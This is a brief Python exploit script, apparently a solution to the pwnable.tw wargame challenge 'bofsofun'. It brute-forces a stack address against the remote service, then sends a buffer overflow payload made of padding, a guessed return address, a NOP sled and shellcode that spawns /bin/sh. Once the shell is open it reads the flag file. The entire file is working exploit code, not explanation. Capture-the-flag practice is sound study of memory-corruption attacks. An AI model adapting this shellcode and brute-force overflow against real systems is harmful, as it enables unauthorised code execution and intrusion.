from pwnlib.tubes.remote import remote
from pwnlib.util.packing import p32
from time import sleep

random_addr = 0xff89e360
no_whitespace_shellcode = '\x31\xc0\xb0\x30\x01\xc4\x30\xc0\x50\x68\x2f\x2f\x73\x68' \
                          '\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\xb0\xc0\xe8\x04' \
                          '\xcd\x80\xc0\xe8\x03\xcd\x80'

for i in range(10000):
    print i
    try:
        r = remote('pwning.pwnable.tw', 48879)
        print r.recvuntil(':')
        r.sendline('A'*92 + p32(random_addr) + '\x90'*2048 + no_whitespace_shellcode)
        print r.recvuntil('!!\n')
        sleep(0.3)
        r.sendline('cat /home/bofsofun/flag')
        sleep(0.3)
        print r.recv()
    except:
        pass
    r.shutdown()
